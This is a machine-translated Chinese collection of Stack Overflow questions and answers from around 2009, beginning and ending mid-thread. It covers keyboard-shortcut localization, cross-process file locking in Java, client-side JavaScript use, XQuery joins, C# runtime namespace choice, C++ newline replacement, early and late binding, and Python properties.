Java 可以而且应该改进，但我认为不需要一种语言来满足所有需求。这通常是一个坏主意，就像死星一样。

很多程序员只是懒惰，不想学习新东西。他们宁愿坚持使用过去 10 年一直使用的一种语言。

如果您需要速度和对硬件的更多控制，您可以使用 C 之类的东西。如果您需要系统管理任务，您可能最终会使用 shell 脚本或 perl、python 或 ruby​​ 等脚本语言。如果你做很多数学特定的东西，Matlab 是一个不错的选择。等等。

使用最好的工具来完成任务，无论它是什么语言。一个好的程序员应该能够使用任何语言（至于我，我仍在努力）。

* * *

## 回答 #15

> 赞同：1
> 
> 时间：2009-01-28T08:03:55.727

我建议看看[Beyond Java](http://oreilly.com/catalog/9780596100940/)。

Joel on [Software](http://www.joelonsoftware.com/)有一篇很好的[评论](http://www.joelonsoftware.com/items/2006/10/12.html)。

* * *

## 回答 #16

> 赞同：0
> 
> 时间：2009-01-27T16:51:16.880

查看 Java 7 上可用的信息。我想您会发现它计划添加每个人都要求的几个特性，最值得注意的是闭包。

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2009-01-28T05:57:55.717

实际上，我真的同意您的观点，遇到了可以通过您的建议缓解的 Java 问题。

原则上，您可以编写自己的 javac 并使用现有的 Hotspot JRE。但是，如果没有 Sun 的帮助，您真的无法做到这一点。

问题实际上是双重的：1）Sun 的方法是支持“Java 平台”并且抵制新标准，甚至是超集；2）要对 Java 进行任何更改，您必须发布 JSR——而且通常需要企业赞助。公司往往有其他优先事项。

再说一次，我会敦促你推动它。毕竟，直到 2007 年，许多聪明人几乎从头开始重新制作 Java = GNU 类路径。所以就有了“二等JVM语言”的必备人才。

* * *

## 回答 #18

> 赞同：0
> 
> 时间：2009-01-28T08:30:49.247

尽管我确实觉得 Java 已经过时了，但事实是，我认为我们都知道它作为一种语言仍然运行良好。当然，我们可以在其他语言中找到的许多更新的东西都不存在，但它仍然有效！你仍然可以做任何事情，只是有时需要更长的时间和更多的工作。我绝对期待它被取代的那一天，但我只是认为，对于所有用 Java 编写的现有代码和应用程​​序，目前没有办法，（几乎）没有人会转向 Java++。我认为我们正在等待真正的范式转变，就像 C++ 到 C 一样。也许函数式编程可能是下一个大事件，而 Scala 将是下一个 Java。

* * *

## 回答 #19

> 赞同：-1
> 
> 时间：2009-01-27T20:40:03.003

C++ 是面向对象的 C。Java 已经是面向对象的，那么我们将如何进行另一个范式转换，使其成为 Java++？

在某种程度上，我认为情况正好相反。Java 远远领先于 C++。Java 具有高级库和框架，而 C++ 通常仍然是低级的并且与 ansi C 混合（因为我们可以）。

Java 有很好的单元测试可能性，以及都指向同一个方向的大型社区。

拥有更多“功能”并不会使语言变得更好。我认为有可能使情况变得更糟。

最后，将一种语言“放在”另一种语言之前并没有帮助。为工作选择最佳工具。我认为 Java 作为一门语言是相当不错的。然而，C++ 可以使用一些更好的库，例如 Spring 的一个端口。

# localization - 本地化键盘快捷键的策略

> ID：484174
> 
> 赞同：12
> 
> 时间：2009-01-27T16:46:58.607
> 
> 标签：localization, keyboard-shortcuts

我目前参与了一个高度本地化的 WPF 应用程序，我们遇到了一个关于非英语语言菜单上的键盘快捷键的错误。该错误涉及未翻译的修饰键名称（`Shift`,`Ctrl`等），这很容易修复。

然而，这让我想到了快捷键本身，它们通常基于命令的第一个字母，除非由于冲突或约定不可行。当命令名称本地化时，命令和它们各自的快捷方式之间的链接通常会丢失：

*   这值得担心吗？
*   现有的主要应用程序如何应对这个问题？
*   在这种情况下还有其他问题需要考虑吗？

尽管这个问题的灵感来自 WPF 应用程序，但我对一般情况更感兴趣。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-27T17:28:13.843

您应该远离符号键（例如`*`和`<`），因为它们往往会在国际键盘上移动。参见[维基百科：键盘布局](http://en.wikipedia.org/wiki/Keyboard_layout#Swedish.2FFinnish)

如果您计划根据本地化切换字母，您应该让用户选择他/她是否想要英文变体。如果我必须根据语言学习两组快捷方式，这会令人沮丧。（跨平台应用程序也是如此。）

最好是完全可定制的键盘快捷键，但对于高级用户来说可能更多。有关示例，请参阅[Media Player Classic 。](http://sourceforge.net/projects/guliverkli/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-29T00:22:03.960

在搜索更多信息时，我发现了一篇关于这个确切主题的优秀[博客文章。](http://blog.i18n.ro/are-we-supposed-to-localize-keyboard-shortcuts/)

总结一下：

> *   如果可能，不更改快捷方式
> *   如果某个键在特定布局上不可用，我们应该尝试使用相同的物理位置
> *   应用程序语言和键盘布局之间不应该有联系
> *   认为应用程序语言将匹配键盘布局是错误的。我给你举个例子：在罗马尼亚，超过 95% 的计算机使用美式键盘布局，另外 5% 使用 4-5 种不同的罗马尼亚键盘布局中的一种。
> *   有些人使用多种键盘布局 - 通常他们是高级用户，我们不能忽视他们键盘布局可以随时切换
> *   只有拉丁字符才能安全使用

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-11-13T07:37:37.620

微软对此有指导方针，值得一试：http: [//msdn.microsoft.com/en-us/library/windows/desktop/bb545460.aspx#choosing](http://msdn.microsoft.com/en-us/library/windows/desktop/bb545460.aspx#choosing)

并且来自[顶级准则违规](http://msdn.microsoft.com/en-us/library/windows/desktop/aa511331.aspx)：

*   不要将访问键与快捷键混淆。虽然访问键和快捷键都提供了对 UI 的键盘访问，但它们有不同的用途和指导方针。
*   为最常用的命令分配快捷键。不常用的程序和功能不需要快捷键，因为用户可以使用访问键代替。
*   不要为众所周知的快捷键分配不同的含义。因为它们是被记住的，众所周知的快捷方式的不一致的含义是令人沮丧和容易出错的。有关 Windows 程序使用的众所周知的快捷键，请参阅 Windows 键盘快捷键。
*   不要尝试分配系统范围的程序快捷键。只有当你的程序有输入焦点时，你的程序的快捷键才会生效。

# java - 如何在不同的应用程序级别锁定文件？

> ID：484182
> 
> 赞同：6
> 
> 时间：2009-01-27T16:49:01.987
> 
> 标签：java, multithreading, file, synchronization, locking

这是场景：我有一个在 servlet 容器内运行的多线程 Java Web 应用程序。该应用程序在 servlet 容器内多次部署。有多个 servlet 容器在不同的服务器上运行。

也许这张图清楚地表明：

```
server1
+- servlet container
   +- application1
   |  +- thread1
   |  +- thread2
   +- application2
      +- thread1
      +- thread2
server2
+- servlet container
   +- application1
   |  +- thread1
   |  +- thread2
   +- application2
      +- thread1
      +- thread2 
```

网络共享目录中有一个文件，所有这些线程都可以访问。他们确实经常访问该文件。大多数情况下，文件仅由这些线程读取。但有时会写出来。

### 我需要一个故障安全解决方案来同步所有这些线程，以保证数据一致性。

* * *

**不起作用（正确）的解决方案**：

1.  *使用 java.nio.channels.FileLock*
    我可以使用 FileLock 类同步来自不同服务器的线程。但这不适用于同一进程（servlet 容器）内的线程，因为文件锁在进程范围内可用。

2.  *使用单独的文件进行同步，*
    我可以创建一个单独的文件，指示进程正在读取或写入文件。此解决方案适用于所有线程，但有几个缺点：

    *   表现。创建、删除和检查文件是相当慢的操作。具有一个同步文件的低权重实现将阻止文件的并行读取。
    *   在需要手动清理的 JVM 崩溃后，同步文件将保留。
    *   我们已经在删除网络文件系统上的文件时遇到了奇怪的问题。
3.  *使用消息传递*
    我们可以实现一个消息传递系统，线程将使用它来协调文件访问。但这对于这个问题来说似乎太复杂了。再说一遍：性能会很差。

有什么想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-27T16:56:40.537

您已经列举了可能的解决方案，除了显而易见的解决方案：*删除对该文件的依赖*

线程是否有另一种方法来获取该数据而不是从文件中读取它？如何设置某种进程来负责协调对该信息的访问，而不是让所有线程读取文件。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-01-27T16:57:39.473

A. 听起来是时候建立数据库了 :-)。与其拥有共享文件，不如将数据存储在数据库中。

B. 或者 - 分层：

1.  使用标准同步锁锁定进程中的线程。
2.  使用基于文件的锁定类型的东西锁定进程间/机器 - 例如创建一个目录来保存锁定。

将 2 嵌套在 1 内。

还是有清理问题。

C. 或者某种写入新文件/重命名策略以便读者不需要锁定可能？

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-01-28T07:57:43.587

最简单的解决方案是创建另一个进程（Web 服务或对您来说最简单的任何东西）。只有这个进程读取/写入文件并监听其他服务的读取/写入请求。

虽然这似乎比直接使用网络共享要慢，但情况并非如此：使用网络共享意味着使用内置在您的操作系统中的客户端/服务器（这正是这样做的：发送读/写请求到提供共享的服务器）。

由于您的服务针对任务进行了优化（而不是一般的“服务文件”服务），它甚至可能更快。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-01-27T17:00:00.593

使用带有 ReadWriteLock 的 java.nio.channels.FileLock。

如果我是你，我会从所有业务代码中隐藏 File、FileChannel 和所有 FileOutputStream。替换为我自己的简单适配器类，如 DAO。

例如

```
abstract class MyWriter{
    private FileChannel file;
    public void writeSomething(byte[] b){
        // get VM scope write lock here
        // get file lock here
        // do write
        // release file lock
        // release readwritelock lock
    }
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-01-27T17:45:52.700

您能否在应用程序中使用[信号量](http://java.sun.com/j2se/1.5.0/docs/api/java/util/concurrent/Semaphore.html)来控制访问？

引用 API “信号量通常用于限制可以访问某些（物理或逻辑）资源的线程数”

虽然 API 可能保持特定于容器的特性，但分布式信号量的概念应该是可以实现的，可能使用[JGroups](http://www.jgroups.org/)。

在 Google 上粗略搜索“分布式 Java 信号量”时出现了[Jukebox](http://jukebox4.sourceforge.net/Components/semaphores.html)，看起来它可以解决上述问题

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-01-28T07:59:57.763

如果您只需要很少写入文件，那么以临时名称写入文件然后使用重命名使其对读者“可见”如何？

不过，这只适用于 Unix 文件系统。在 Windows 上，您需要处理某些进程打开文件（用于读取）的情况。在这种情况下，重命名将失败。再试一次，直到重命名成功。

我建议彻底测试一下，因为您可能会遇到拥塞：读取请求太多，写入器任务长时间无法替换文件。

如果是这种情况，请让阅读器检查临时文件并等待下一次阅读，直到文件消失。

# javascript - 多少javascript太多了

> ID：484183
> 
> 赞同：14
> 
> 时间：2009-01-27T16:49:22.423
> 
> 标签：javascript, ajax

我最近一直在与某人合作一个非常密集的 ajax 项目。所有调用都使用 ajax 对 Web 服务进行，数据逻辑在客户端处理。服务器端代码仅充当[数据访问层](http://en.wikipedia.org/wiki/Data_access_layer)，几乎没有其他作用。多少javascript太多了？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2009-01-27T16:53:19.013

当Javascript向客户端显示太多时，它可能太多了，所以我会从安全的角度来看。从性能的角度来看，一般使用 Javascript 更好。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2009-01-27T16:52:35.083

这实际上取决于您的需求和用户的期望。我唯一的建议是当用户**真正**希望导航一个新页面时，想想你正在做 AJAX 的地方。这些是你做“太多”的情况。

请记住，用户 99% 的时间都在使用其他网站，而不是您的网站。确保您的网站符合他/她对网络其他部分以及一般使用计算机的期望。

顺便说一句，可用性测试可用于找出任何领域的“用户真正期望的东西”。您作为设计师的判断可能与典型用户的判断完全不同；另请参阅[为什么您只需要使用 5 个用户进行测试](http://www.useit.com/alertbox/20000319.html)。

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2009-01-27T16:52:45.210

如果生成的应用程序直观且对用户有用，那么您不能说它过多地使用了一种技术或另一种技术。

**提供出色的用户体验是我们作为软件开发人员的主要目标**。我们用来做这件事的技术只是一个推动者。

我们只是在以下情况下使用了太多/错误的技术：

1.  应用程序不直观或偏离用户的心理模型，或
2.  对于那些追随我们的人来说，该应用程序过于困难或过于昂贵而无法维护

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2009-01-27T16:54:08.700

我不介意使用 javascript，只要它不暴露敏感信息或开放安全漏洞。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2009-01-27T16:53:30.760

问题是，该应用程序是否仍提供必要的功能，如书签和尊重用户浏览历史记录？

如果用户无法为特定页面/状态添加书签，那应该是可添加书签的，这是一个警告信号。

不能明智地使用后退按钮也会导致悲伤。

* * *

## 回答 #6

> 赞同：3
> 
> 时间：2009-01-27T16:54:45.237

我想说的是，对于任何技术，如果您忽略了一种更直接的解决问题的方法，而倾向于“以相同的方式”做所有事情，那么您很有可能已经完成了。证明这一点的一个简单方法是花一些额外的时间来编写一个不使用相关方法的概念证明功能，并跟踪你需要多长时间等。如果你可以用你的概念证明完成同样的事情，并且为用户提供合适的体验，那么开发策略可能需要改变。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-01-27T16:56:54.560

我想指出以前的问题/答案：

[您网站上的自定义 jQuery 脚本中有多少行代码？多少才算太多？](https://stackoverflow.com/questions/375891/how-many-lines-of-code-is-in-your-custom-jquery-script-on-your-site-and-how-much#375911)

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2009-01-27T16:54:34.207

太多的东西是：

当你看不懂代码时

当用户没有*得到/不需要/喜欢/等*用户界面时

当您杀死所需的任何服务器端/客户端资源时

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2009-01-27T17:12:48.537

这实际上取决于项目的用途。

用户是谁？这只是内部的事情还是会向世界开放？他们期待一个常规的网络风格界面吗？这会妨碍视线的可用性吗？

它需要有多安全？使用 javascript 会向用户打开很多应用程序，这可能是一个安全问题。

典型的用户机器可以处理那么多的 javascript（旧机器几乎没有用很多 javascript）吗？

有很多问题需要回答，然后你才能决定有多少 javascript 太多了。

最终，它很可能最终由测试和用户反馈决定。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-01-27T17:31:04.803

这取决于许多因素：

*   该脚本是否向最终用户透露了有关您的应用程序内部运作的信息？
*   您需要支持各种浏览器吗？
*   您是否需要支持移动用户（或 PDA）？
*   您是否使用 Javascript 执行业务逻辑？（一般这应该在服务器上完成）
*   等等。

一旦你得到了这些问题的答案，我认为很容易确定你是否在某处越界。除此之外，从性能的角度来看，将处理器负载分配给客户端总是一件好事。强制执行客户端业务逻辑也很好，但请确保您在服务器上仔细检查。

希望这可以帮助。

# xml - XQuery 多个 xml 文件？

> ID：484192
> 
> 赞同：8
> 
> 时间：2009-01-27T16:51:34.977
> 
> 标签：xml, xquery

是否可以从 xQuery 打开 2 个文档并对它们进行连接？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2009-01-27T18:10:22.573

**是的，这是[XQuery 规范](http://www.w3.org/TR/xquery)中的[一个示例](http://www.w3.org/TR/xquery/#id-example-applications)。：**

“联接将来自多个源的数据组合成一个结果，是一种非常重要的查询类型。在本节中，我们将说明如何在 XQuery 中表达几种类型的联接。我们将基于以下三个文档来举例说明：

1.  `parts.xml`包含许多`part`元素的命名文档；每个`part`元素依次包含`partno`和`description`子元素。
2.  `suppliers.xml`包含许多`supplier`元素的命名文档；每个`supplier`元素依次包含`suppno`和`suppname`子元素。
3.  `catalog.xml`包含有关供应商和零件之间关系的信息的命名文档。目录文档包含许多`item`元素，每个元素又包含`partno`、`suppno`和`price`子元素。

常规（“内部”）连接返回来自两个或多个相关源的信息，如下面的示例所示，它结合了来自三个文档的信息。该示例生成从目录文档派生的“描述性目录”，但包含部件描述而不是部件编号和供应商名称而不是供应商编号。新目录按零件描述的字母顺序排列，其次是供应商名称。*

```
<descriptive-catalog>
   { 
     for $i in fn:doc("catalog.xml")/items/item,
         $p in fn:doc("parts.xml")/parts/part[partno = $i/partno],
         $s in fn:doc("suppliers.xml")/suppliers
                  /supplier[suppno = $i/suppno]
     order by $p/description, $s/suppname
     return
        <item>
           {
           $p/description,
           $s/suppname,
           $i/price
           }
        </item>
   }
</descriptive-catalog> 
```

前面的查询仅返回有关具有供应商的零件和具有零件的供应商的信息。**外连接**是保留来自一个或多个参与源的信息的连接，包括在另一个源中没有匹配元素的元素。例如，供应商和零件之间的**左外连接**可能会返回有关没有匹配零件的供应商的信息。”

**请注意，XQuery 没有标准的 document() 函数**（它是一个[**XSLT 函数**](http://www.w3.org/TR/xslt20/#function-document)），而是具有[**doc()**](http://www.w3.org/TR/xpath-functions/#func-doc)函数，它是“ [XQuery 1.0 和 XPath 2.0 函数和运算符](http://www.w3.org/TR/xpath-functions)”的一部分。

**克里斯的回答至少有两个错误**：

1.  **XQuery[区分大小写](http://www.w3.org/TR/xquery/#lexical-structure)**——在 Chris 的示例中使用的大写关键字将不会被符合标准的 XQuery 处理器所允许。
2.  **不需要**像 doc() 这样的标准函数前缀，我只是引用了带有前缀的 XQuery 规范。否则，在我自己的代码中，我会省略“ `fn`”前缀。
3.  **函数 document() 不是标准的 XQuery/XPath 函数**。应该改用[**doc()**](http://www.w3.org/TR/xpath-functions/#func-doc)函数。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-25T14:35:45.793

它比这更容易（至少使用 SAXON）：

```
let $items := (
     doc("file1.xml") ,
     doc("file2.xml") ,
     doc("file3.xml")
)

for $x in $items ... 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-01-27T18:08:26.087

在 XQuery 中，如果您编写如下内容：

```
for $x in doc('doc1.xml')//a
for $y in doc('doc2.xml')//a
where $x/@name = $y/@name
return $x 
```

那么您的 XQuery 处理器应该足够聪明，可以发现这是一个连接。

您永远不会在 XQuery 中明确指定某事物是连接。XQuery 的共同主题是您的程序说明您想要**什么信息，而不是****如何**计算它。

虽然看起来您在实践中重复循环第二个文档，但真正的 XQuery 处理器会更智能地执行此操作，大致类似于以下 SQL 语句（我的 SQL 非常生疏，因此如果此语法完全错误，我深表歉意）

```
SELECT doc1.a
FROM doc1 INNER JOIN doc2
WHERE doc1.name = doc2.name 
```

XMark[基准](http://www.xml-benchmark.org/)测试包含几个示例查询，这些非常值得一看。特别是查询 9 到 12 执行连接。

# c# - 在运行时选择“使用”命名空间

> ID：484212
> 
> 赞同：1
> 
> 时间：2009-01-27T16:56:07.870
> 
> 标签：c#, web-services

我有一个连接到第 3 方的 Web 服务的 Web 服务客户端应用程序。第 3 方更新了他们的 Web 服务，所以现在我的客户端应用程序因 SOAP 异常而失败。不幸的是，我不能简单地更新我的应用程序以使用新的 Web 服务，因为我的一些用户仍将使用旧的 Web 服务。所以基本上我希望能够使用我的客户端应用程序的单个版本来处理任一版本的 Web 服务。

由于 Visual Studio 会在添加 Web 引用时生成一堆我编译的代码，因此我现在有两个文件：一个为每个版本的 Web 服务生成的文件。这两个 API 实际上是相同的，只是底层的 SOAP 消息似乎发生了变化。我已将每个生成的文件放入它们自己的命名空间以避免冲突。所以现在我希望能够选择在运行时使用哪个命名空间（基于配置参数）。

例如：

```
if (useOldVersion)
    using OldVersionNamespace;
else
    using NewVersionNamespace; 
```

显然，这永远不会奏效，因为无法编译引用此命名空间中元素的代码。有没有简单的方法来处理这个问题？也许我可以在运行时使用反射来做我需要的事情？

我唯一能真正想到的是将我当前的代码复制/粘贴到两个不同的文件中，唯一的区别是在顶部使用了哪个命名空间。不过，这似乎是一个非常糟糕的主意。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-01-27T17:02:26.360

使两组生成的类都实现一个公共接口。对于部分类型，这很容易——您根本不需要更改生成的类，只需创建一个适当的接口，然后创建一个与生成的类型相同的文件，说它们实现了接口。

然后，您对接口进行编码，并根据配置文件在一个地方选择要选择的实现。

这样做的另一个好处是，您可以针对您的代码编写单元测试，模拟 Web 服务。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-27T22:41:47.593

如果你不能使用编译时间吗？

```
#If (BuildType)
using X;
#else
using Y;
#endif 
```

[http://msdn.microsoft.com/en-us/library/4y6tbswk.aspx](http://msdn.microsoft.com/en-us/library/4y6tbswk.aspx[link) [链接文本][1]

这又快又脏。希望有帮助！

# c++ - 替换 STL 字符串中的换行符

> ID：484213
> 
> 赞同：11
> 
> 时间：2009-01-27T16:56:20.443
> 
> 标签：c++, stl

我怎样才能`\r\n`在一个替换`std::string`？

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2009-01-27T20:00:31.103

不要重新发明轮子，Boost String Algorithms 是一个只有头文件的库，我有理由确定它可以在任何地方工作。如果您认为接受的答案代码更好，因为它已提供并且您不需要查看文档，请点击此处。

```
#include <boost/algorithm/string.hpp>
#include <string>
#include <iostream>

int main()
{
    std::string str1 = "\r\nsomksdfkmsdf\r\nslkdmsldkslfdkm\r\n";
    boost::replace_all(str1, "\r\n", "Jane");
    std::cout<<str1;
} 
```

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2009-01-27T17:36:46.133

用这个 ：

```
while ( str.find ("\r\n") != string::npos )
{
    str.erase ( str.find ("\r\n"), 2 );
} 
```

更有效的形式是：

```
string::size_type pos = 0; // Must initialize
while ( ( pos = str.find ("\r\n",pos) ) != string::npos )
{
    str.erase ( pos, 2 );
} 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2009-01-27T17:17:08.810

请参阅[Boost 字符串算法](http://www.boost.org/doc/libs/1_37_0/doc/html/string_algo/usage.html#id3677520)库。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2009-01-27T17:18:03.490

首先使用 find() 查找 "\r\n"，然后使用 replace() 将其他内容放在那里。看看参考资料，它有一些例子：

[http://www.cplusplus.com/reference/string/string/find.html](http://www.cplusplus.com/reference/string/string/find.html)

[http://www.cplusplus.com/reference/string/string/replace.html](http://www.cplusplus.com/reference/string/string/replace.html)

# c# - 早期和晚期绑定

> ID：484214
> 
> 赞同：88
> 
> 时间：2009-01-27T16:56:35.153
> 
> 标签：c#, binding, late-binding

当 C# 中发生早期/晚期绑定时，我正试图弄清楚。

非虚拟方法总是早期绑定的。虚拟方法总是后期绑定的：编译器插入额外的代码来解析在执行时绑定到的实际方法并检查类型安全。所以亚型多态性使用后期绑定。

使用反射调用方法是后期绑定的一个例子。我们编写代码来实现这一点，而不是编译器。（例如调用 COM 组件。）

当 Option Strict 关闭时，VB.NET 支持隐式后期绑定。当一个对象被分配给一个声明为 Object 类型的变量时，它是后期绑定的。VB 编译器插入代码以在执行时绑定到正确的方法并捕获无效调用。C# 不支持此功能。

我是否朝着正确的方向前进？

调用委托和通过接口引用调用方法呢？是早绑定还是晚绑定？

* * *

## 回答 #1

> 赞同：106
> 
> 时间：2009-01-27T17:03:31.600

除非您通过反射接口，否则一切都在 C# 中早期绑定。

早期绑定只是意味着在编译时找到目标方法，并创建将调用它的代码。它是否是虚拟的（这意味着在调用时需要额外的步骤来找到它是无关紧要的）。如果该方法不存在，编译器将无法编译代码。

后期绑定意味着在运行时查找目标方法。通常使用方法的文本名称来查找它。如果方法不存在，砰。程序将在运行时崩溃或进入一些异常处理方案。

大多数脚本语言使用后期绑定，而编译语言使用早期绑定。

C#（版本 4 之前）没有后期绑定；然而，他们可以使用反射 API 来做到这一点。该 API 编译为通过在运行时挖掘程序集来查找函数名称的代码。如果 Option Strict 关闭，VB 可以后期绑定。

绑定通常会影响性能。因为后期绑定需要在运行时查找，这通常意味着方法调用比早期绑定方法调用慢。

* * *

对于普通函数，编译器可以计算出它在内存中的数字位置。然后它在调用函数时可以生成一条指令来调用该地址处的函数。

对于具有任何虚方法的对象，编译器将生成一个 v-table。这本质上是一个包含虚拟方法地址的数组。每个具有虚方法的对象都将包含一个由编译器生成的隐藏成员，它是 v-table 的地址。当调用虚函数时，编译器会计算出相应方法在 v-table 中的位置。然后它将生成代码以查看对象 v-table 并在此位置调​​用虚拟方法。

因此，对虚拟功能进行了查找。这是经过高度优化的，因此它会在运行时很快发生。

**早绑定**

*   编译器可以在编译时计算出被调用函数的位置。
*   编译器可以尽早（在任何程序代码运行之前）保证该函数将存在并在运行时可调用。
*   编译器保证函数采用正确数量的参数并且它们是正确的类型。它还检查返回值的类型是否正确。

**后期装订**

*   查找将花费更长的时间，因为它不是简单的偏移计算，通常需要进行文本比较。
*   目标函数可能不存在。
*   目标函数可能不接受传递给它的参数，并且可能具有错误类型的返回值。
*   对于某些实现，目标方法实际上可以在运行时更改。因此，查找可能会执行不同的功能。我认为这发生在 Ruby 语言中，您可以在程序运行时在对象上定义一个新方法。后期绑定允许函数调用开始为方法调用新的覆盖，而不是调用现有的基方法。

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2009-01-27T17:53:04.277

C# 3 使用早期绑定。

`dynamic`C# 4 使用关键字添加后期绑定。有关详细信息，请参阅Chris Burrow关于该主题[的博客条目。](http://blogs.msdn.com/cburrows/archive/2008/10/27/c-dynamic.aspx)

至于虚拟与非虚拟方法，这是一个不同的问题。如果我调用`string.ToString()`，则 C# 代码将绑定到虚拟`object.ToString()`方法。调用者的代码不会根据对象的类型而改变。相反，虚拟方法是通过函数指针表调用的。对象的实例是指指向其`ToString()`方法的对象表。一个字符串的实例有它的虚拟方法表指向它的`ToString()`方法。是的，这就是多态性。但它不是后期绑定。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-07-09T14:57:44.610

在大多数情况下，早期绑定是我们每天都在做的事情。例如，如果我们有一个`Employee`在编译时可用的类，我们只需创建该类的实例并调用任何实例成员。这是早期绑定。

```
//Early Binding
**Employee** employeeObject = new **Employee**();
employeeObject.CalculateSalary(); 
```

另一方面，如果您在编译时不了解类，那么唯一的方法是使用反射进行后期绑定。我遇到了一个解释这些概念的精彩视频——[这里是链接](http://csharp-video-tutorials.blogspot.com/2012/07/part-55-c-tutorial-late-binding-using.html)。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-09-27T18:45:11.963

Its a very old post but wanted to add more info to it. Late binding is used when you dont want to instantiate object at compile time. In `C#` you use `Activator` to call bind object at runtime.

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2017-05-25T07:25:44.570

早期绑定

这个名字本身描述了编译器知道它是什么类型的对象，它包含的所有方法和属性是什么。声明对象后，.NET Intellisense 将在单击点按钮时填充其方法和属性。

常见示例：

组合框 cboItems;

列表框 lstItems; 在上面的示例中，如果我们键入 cboItem 并在后面放置一个点，它将自动填充组合框的所有方法、事件和属性，因为编译器已经知道它是一个组合框。

后期装订

这个名字本身描述了编译器不知道它是什么类型的对象，它包含的所有方法和属性是什么。您必须将其声明为对象，稍后您需要获取对象的类型，存储在其中的方法。一切都将在运行时知道。

常见示例：

对象对象；

objItems = CreateObject("DLL 或程序集名称"); 在编译期间，objItems 的类型是不确定的。我们正在创建一个 dll 的对象并将其分配给 objItems，因此一切都在运行时确定。

早期绑定与后期绑定

现在进入画面......</p>

应用程序将在早期绑定中运行得更快，因为这里没有装箱或拆箱。

更容易在早期绑定中编写代码，因为智能感知将自动填充

早期绑定中的最小错误，因为在编译时检查语法。

后期绑定将支持所有类型的版本，因为一切都是在运行时决定的。

如果使用后期绑定，则代码对未来增强的影响最小。

性能将是早期绑定中的代码。两者各有优缺点，根据场景选择合适的绑定是开发者的决定。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2012-09-04T12:14:42.553

简单来说，早期绑定发生在编译时，编译器知道类型及其所有成员，后期绑定发生在运行时，编译器对类型及其成员一无所知。我在 youtube 上看到了一个很好的视频，它解释了这些概念。

[http://www.youtube.com/watch?v=s0eIgl5iqqQ&list=PLAC325451207E3105&index=55&feature=plpp_video](http://www.youtube.com/watch?v=s0eIgl5iqqQ&list=PLAC325451207E3105&index=55&feature=plpp_video)

[http://www.youtube.com/playlist?list=PLAC325451207E3105](http://www.youtube.com/playlist?list=PLAC325451207E3105)

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2010-04-26T08:48:26.410

本文是构建 .net 组件的指南，在运行时使用后期绑定在 Vb6 项目中使用它，附加它的事件并获取回调。

[http://www.codeproject.com/KB/cs/caspivb6callback2.aspx](http://www.codeproject.com/KB/cs/csapivb6callback2.aspx)

本文是构建 .NET 组件并在 VB6 项目中使用它的指南。关于这个问题的示例有很多，那我为什么要写一个新的呢？在我看来，在其他文章中，缺少的部分是在运行时附加其事件。所以在本文中，我们将构建一个 .NET 组件，将其标记为 COM 可见组件，在 VB6 运行时使用它并附加到它的事件。

[https://www.codeproject.com/Articles/37127/Internet-Explorer-Late-Binding-Automation](https://www.codeproject.com/Articles/37127/Internet-Explorer-Late-Binding-Automation)

大多数开发人员经常需要 Internet Explorer 自动化，这基本上意味着以编程方式打开浏览器、填写一些表单和发布数据。

最常见的方法是使用 shdocvw.dll（Microsoft Web 浏览器控件）和 Mshtml.dll（HTML 解析和呈现组件），或 Microsoft.Mshtml.dll，它实际上是 Mshtml.dll 的 .NET 包装器。您可以在此处获取有关 Internet Explorer - 关于浏览器的更多信息。

如果您选择上述方法和 DLL，让我们看看您可能需要处理的一些问题：

您必须分发这些 DLL，因为您的项目将依赖于这些 DLL，如果您无法正确部署它们，这将是一个严重的问题。只需对 shdocvw 和 mshtml.dll 分发问题进行一些谷歌搜索，您就会明白我在说什么。您必须部署一个 8 MB Microsoft.mshtml.dll，因为此 DLL 不是 .NET 框架的一部分。在这种情况下，我们需要做的是使用后期绑定技术。为上述 DLL 编写我们自己的包装器。当然，我们会这样做，因为它比使用这些 DLL 更有用。例如，我们不需要检查文档下载操作是否完成，因为 IEHelper 会为我们完成这项工作。

# python - 使用 getattr [ python ] 在实例上调用方法

> ID：484220
> 
> 赞同：1
> 
> 时间：2009-01-27T16:57:09.240
> 
> 标签：python, dynamic, attributes, properties

我试图编写一些代码来检查项目是否具有某些属性，并调用它们。我试图用 getattr 做到这一点，但修改不会是永久性的。我做了一个“虚拟”类来检查这个。这是我用于课程的代码：

```
 class X:                                         
   def __init__(self):
     self.value = 90  
   def __get(self):   
     return self.value
   def __set(self,value):
     self.value = value  
   value = property(__get,__set)

x = X()
print x.value # this would output 90
getattr(x,"value=",99) # when called from an interactive python interpreter this would output 99
print x.value # this is still 90 ( how could I make this be 99 ? ) 
```

谢谢 ！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-01-27T16:59:14.353

你需要做类似的事情

```
class X:                                         
   def __init__(self):
     self._value = 90  

   def _get(self):   
     return self._value

   def _set(self, value):
